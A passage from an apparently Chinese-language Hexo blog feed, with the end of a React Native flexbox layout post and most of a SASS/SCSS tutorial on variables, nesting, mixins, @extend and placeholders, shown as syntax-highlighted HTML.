&lt;/</span>View&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">height</span>: <span class="number">50</span>, <span class="attr">backgroundColor</span>: <span class="string">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class="line">        &lt;View style=&#123;&#123;<span class="attr">height</span>: <span class="number">100</span>, <span class="attr">backgroundColor</span>: <span class="string">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class="line">      &lt;<span class="regexp">/View&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>alignSelf: <code>flex-start|flex-end|center|stretch</code></strong></p><p><img src="/view/posts/e61ae078/image-20200326160914205.png" alt="image-20200326160914205" style="zoom:50%;"></p><h3 id="Align-Content"><a href="#Align-Content" class="headerlink" title="Align Content"></a>Align Content</h3><p>alignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。</p><ul><li><code>flex-start</code>（默认值）将换行对齐到容器横轴的起点。</li><li><code>flex-end</code>将换行对齐到容器横轴的末端。</li><li><code>stretch</code> 包装线以匹配容器横轴的高度。</li><li><code>center</code>将包装线对齐到容器横轴的中心。</li><li><code>space-between</code>在容器的主轴上均匀间隔的线，在线之间分配剩余空间。</li><li><code>space-around</code>在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。</li><li><code>space-evenly</code> 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。</li></ul><p><img src="/view/posts/e61ae078/image-20200331154557560.png" alt="image-20200331154557560" style="zoom:67%;"></p><h3 id="Flex-Wrap"><a href="#Flex-Wrap" class="headerlink" title="Flex Wrap"></a>Flex Wrap</h3><p>flexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。</p><p>换行时，可以使用alignContent指定行在容器中的放置方式。</p><p><img src="/view/posts/e61ae078/image-20200331154722643.png" alt="image-20200331154722643" style="zoom:50%;"></p><h3 id="Flex-Basis-Grow-and-Shrink"><a href="#Flex-Basis-Grow-and-Shrink" class="headerlink" title="Flex Basis, Grow, and Shrink"></a>Flex Basis, Grow, and Shrink</h3><ul><li><p>flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。</p><ul><li>flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。</li></ul></li><li><p>flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。</p><ul><li>Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。</li></ul></li><li><p>flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。</p></li></ul><h3 id="宽度和高度"><a href="#宽度和高度" class="headerlink" title="宽度和高度"></a>宽度和高度</h3><p>Yoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。</p><p>宽度和高度都可以采用以下值：</p><ul><li><p>auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。</p></li><li><p>pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。</p></li><li><p>percent定义宽度或高度，以其父级宽度或高度的百分比表示。</p></li></ul><h3 id="绝对和相对布局"><a href="#绝对和相对布局" class="headerlink" title="绝对和相对布局"></a>绝对和相对布局</h3><p>元素的位置类型定义了元素在其父元素中的位置。</p><p>相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。</p><p>绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。</p><p><img src="/view/posts/e61ae078/image-20200331155044160.png" alt="image-20200331155044160" style="zoom:50%;"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;入门基础&quot;&gt;&lt;a href=&quot;#入门基础&quot; class=&quot;headerlink&quot; title=&quot;入门基础&quot;&gt;&lt;/a&gt;入门基础&lt;/h1&gt;&lt;h2 id=&quot;核心组件和原生组件&quot;&gt;&lt;a href=&quot;#核心组件和原生组件&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="ReactNative" scheme="http://yoursite.com/categories/ReactNative/"/>
    
    
      <category term="ReactNative" scheme="http://yoursite.com/tags/ReactNative/"/>
    
  </entry>
  
  <entry>
    <title>SASS</title>
    <link href="http://yoursite.com/posts/ea50967e.html"/>
    <id>http://yoursite.com/posts/ea50967e.html</id>
    <published>2020-03-24T00:19:20.000Z</published>
    <updated>2020-06-22T10:04:59.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SASS"><a href="#SASS" class="headerlink" title="SASS"></a>SASS</h1><h2 id="什么是SASS"><a href="#什么是SASS" class="headerlink" title="什么是SASS"></a>什么是SASS</h2><p>​    SASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。</p><h3 id="SASS的特征"><a href="#SASS的特征" class="headerlink" title="SASS的特征"></a>SASS的特征</h3><ul><li>完全兼容 CSS3</li><li>在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能</li><li>通过函数进行颜色值与属性值的运算</li><li>提供控制指令等高级功能</li><li>自定义输出格式</li></ul><h3 id="SASS的语法格式"><a href="#SASS的语法格式" class="headerlink" title="SASS的语法格式"></a>SASS的语法格式</h3><p>SASS分为两种语法，一种是SCSS，另一种就是SASS。</p><p>SCSS是最新的语法：</p><ul><li>扩展名为.scss</li><li>SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式</li><li>增强了对CSS3语法的支持</li></ul><p>SASS是老语法：</p><ul><li>扩展名为.sass</li><li>SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似</li></ul><p><strong>现在只学习scss语法</strong></p><p>##SCSS语法</p><h3 id="变量（Variables）"><a href="#变量（Variables）" class="headerlink" title="变量（Variables）"></a>变量（Variables）</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$color</span>: <span class="number">#333</span>;  <span class="comment">// 声明变量</span></span><br><span class="line"><span class="variable">$bgcolor</span>:<span class="number">#f36</span>;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$color</span>; <span class="comment">// 引用变量</span></span><br><span class="line">  <span class="attribute">background-color</span>: <span class="variable">$bgcolor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="变量默认值-default"><a href="#变量默认值-default" class="headerlink" title="变量默认值!default"></a>变量默认值!default</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$color</span>:red;</span><br><span class="line"><span class="variable">$color</span>:blue !default;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:<span class="variable">$color</span>; <span class="comment">//red</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，</span></span><br><span class="line"><span class="comment">// 反之如果之前有申明，则用申明的值。</span></span><br><span class="line"><span class="comment">// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。</span></span><br></pre></td></tr></table></figure><h4 id="变量用-包裹"><a href="#变量用-包裹" class="headerlink" title="变量用#{}包裹"></a>变量用<code>#{}</code>包裹</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$btnClass</span>: btn !default;</span><br><span class="line"><span class="variable">$borderDirection</span>:  top !default;</span><br><span class="line"></span><br><span class="line">.#&#123;<span class="variable">$btnClass</span>&#125;&#123;</span><br><span class="line">    <span class="attribute">border</span>-#&#123;<span class="variable">$borderDirection</span>&#125;:<span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析成的css：</span></span><br><span class="line"><span class="selector-class">.btn</span>&#123;</span><br><span class="line">    <span class="attribute">border-top</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多个变量一起申明"><a href="#多个变量一起申明" class="headerlink" title="多个变量一起申明"></a>多个变量一起申明</h4><p>把多个相关的值写在一个变量里，然后通过<code>nth($var,index)</code>来获取第几个值。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$linkColor</span>: red blue !default;</span><br><span class="line"><span class="selector-tag">a</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:nth(<span class="variable">$linkColor</span>,<span class="number">1</span>);</span><br><span class="line">    &amp;:hover&#123;</span><br><span class="line">        <span class="attribute">color</span>:nth(<span class="variable">$linkColor</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析成的css：</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">a</span>:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="嵌套-Nesting"><a href="#嵌套-Nesting" class="headerlink" title="嵌套(Nesting)"></a>嵌套(Nesting)</h3><p>SASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。</p><p>然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。</p><h4 id="选择器的嵌套"><a href="#选择器的嵌套" class="headerlink" title="选择器的嵌套"></a>选择器的嵌套</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$color</span>: <span class="number">#333</span>; </span><br><span class="line"><span class="variable">$bgcolor</span>:<span class="number">#f36</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">section</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f36</span>;</span><br><span class="line">  <span class="selector-tag">nav</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$color</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#0982c1</span>;</span><br><span class="line">      &amp;:hover&#123;</span><br><span class="line">        <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="样式的嵌套"><a href="#样式的嵌套" class="headerlink" title="样式的嵌套"></a>样式的嵌套</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span> &#123; </span><br><span class="line">  <span class="attribute">font</span>: &#123; </span><br><span class="line">    style:italic; </span><br><span class="line">    family:serif; </span><br><span class="line">    weight:bold; </span><br><span class="line">    size:<span class="number">1.2em</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 当然font属性可以使用css3的合写，那就更简单了</span></span><br><span class="line"><span class="selector-tag">li</span> &#123; </span><br><span class="line">  <span class="attribute">font</span>: serif italic bold <span class="number">1.2em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mixins"><a href="#Mixins" class="headerlink" title="Mixins"></a>Mixins</h3><p>Mixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> error(<span class="variable">$borderWidth</span>: 2px)&#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="variable">$borderWidth</span> solid <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f00</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">span</span> &#123;</span><br><span class="line">  @<span class="keyword">include</span> error(<span class="number">10px</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Example: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line"><span class="variable">$prefix-for-webkit</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-mozilla</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-microsoft</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-opera</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-spec</span>: true !default; <span class="comment">// required for keyframe mixin</span></span><br><span class="line"><span class="comment">//prefixer</span></span><br><span class="line">@<span class="keyword">mixin</span> prefixer (<span class="variable">$property</span>, <span class="variable">$value</span>, <span class="variable">$prefixes</span>) &#123;</span><br><span class="line">  @<span class="keyword">each</span> <span class="variable">$prefix</span> in <span class="variable">$prefixes</span> &#123;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$prefix</span> == webkit and <span class="variable">$prefix-for-webkit</span> == true &#123;</span><br><span class="line">      -webkit-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">else</span> if <span class="variable">$prefix</span> == moz and <span class="variable">$prefix-for-mozilla</span> == true &#123;</span><br><span class="line">      -moz-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">else</span> if <span class="variable">$prefix</span> == ms and <span class="variable">$prefix-for-microsoft</span> == true &#123;</span><br><span class="line">      -ms-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">else</span> if <span class="variable">$prefix</span> == o and <span class="variable">$prefix-for-opera</span> == true &#123;</span><br><span class="line">      -o-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">else</span> if <span class="variable">$prefix</span> == spec and <span class="variable">$prefix-for-spec</span> == true &#123;      #&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">else</span> &#123;</span><br><span class="line">      @<span class="keyword">warn</span> <span class="string">"Unrecognized prefix: #&#123;$prefix&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> skewX(<span class="variable">$degrees</span>) &#123;</span><br><span class="line">  @<span class="keyword">include</span> prefixer(transform, skewX(<span class="variable">$degrees</span>), webkit moz o ms spec);</span><br><span class="line">  -webkit-<span class="attribute">backface-visibility</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  @<span class="keyword">include</span> skewX(<span class="number">45deg</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">-webkit-transform</span>: <span class="built_in">skewX</span>(45deg) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">-moz-transform</span>: <span class="built_in">skewX</span>(45deg);</span><br><span class="line">  <span class="attribute">-o-transform</span>: <span class="built_in">skewX</span>(45deg);</span><br><span class="line">  <span class="attribute">-ms-transform</span>: <span class="built_in">skewX</span>(45deg);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">skewX</span>(45deg);</span><br><span class="line">  <span class="attribute">-webkit-backface-visibility</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend"><a href="#extend" class="headerlink" title="@extend"></a>@extend</h3><p>假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.error</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-id">#f00</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">background-color</span>: <span class="selector-id">#fdd</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.seriousError</span> &#123;</span></span><br><span class="line"><span class="undefined">  border-width: 3px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"error seriousError"</span>&gt;</span></span><br><span class="line">  Oh no! You've been hacked!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>@extend</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.error</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  @<span class="keyword">extend</span> .error;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意@extendh会有一个缺点：</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.error</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这是一个其他样式</span></span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-class">.error</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  @<span class="keyword">extend</span> .error;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在编译后的CSS：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.error</span>, <span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> <span class="selector-class">.error</span>, <span class="selector-tag">p</span> <span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 然而你只想实现</span><br><span class="line"><span class="selector-class">.error</span>, <span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p .error &#123; // 这部分的样式不能干扰到 seriousError</span><br><span class="line">  <span class="selector-tag">color</span>: <span class="selector-tag">blue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，通过<code>@extend</code>引用的类名，你要有绝对的自信，它从未用在几个地方。</p><h3 id="嵌套、Mixins和-extend的缺点"><a href="#嵌套、Mixins和-extend的缺点" class="headerlink" title="嵌套、Mixins和@extend的缺点"></a>嵌套、Mixins和@extend的缺点</h3><p>嵌套：有可能编译的css层级过深</p><p>Mixins：Mixins用来指定具体属性值会使css变得臃肿</p><p><strong>Mixins的黄金规则</strong>是将相似的风格定义在一个<code>@mixin</code>中。请注意这里的一个关键词<strong>相似的</strong>，另外Mixins主要是用于重用，而不是用来指定具体的属性值。</p><p>@extend：<code>@extend</code>是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的<code>.error</code></p><h3 id="强大的-placeholders"><a href="#强大的-placeholders" class="headerlink" title="强大的%placeholders"></a>强大的%placeholders</h3><p>使用<code>%</code>和<code>@extend</code>就可以将继承中埋下的地雷给排了。</p><p><code>%</code>只是一个占位符，他不是正常的选择器，不像<code>.classes</code>或者<code>#ids</code>，只要不通过<code>@extend</code>调用，他是不会产生任何代码量。</p><p>首先使用<code>%placeholders</code>定义一个公用样式，类似于<code>.class</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%placeholders &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要使用的地方通过<code>@extend</code>来调用：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">selector &#123;</span><br><span class="line">  @<span class="keyword">extend</span> %placeholders;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> fit-content() &#123;</span><br><span class="line">    <span class="attribute">width</span>: -webkit-fit-content;</span><br><span class="line">    <span class="attribute">width</span>: -moz-fit-content;</span><br><span class="line">    <span class="attribute">width</span>: -o-fit-content;</span><br><span class="line">    <span class="attribute">width</span>: -ms-fit-content;</span><br><span class="line">    <span class="attribute">width</span>: fit-content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%clearfix &#123;</span><br><span class="line">    *zoom: <span class="number">1</span>;</span><br><span class="line">    &amp;:after,</span><br><span class="line">    &amp;:before &#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">      <span class="attribute">display</span>: table;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">      <span class="attribute">clear</span>: both;</span><br><span class="line">      <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="selector-tag">ul</span> &#123;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">800px</span>;</span><br><span class="line">        @<span class="keyword">include</span> fit-content();</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">list-style</span>: none;</span><br><span class="line">        @<span class="keyword">extend</span> %clearfix;</span><br><span class="line">    &#125;</span><br><span 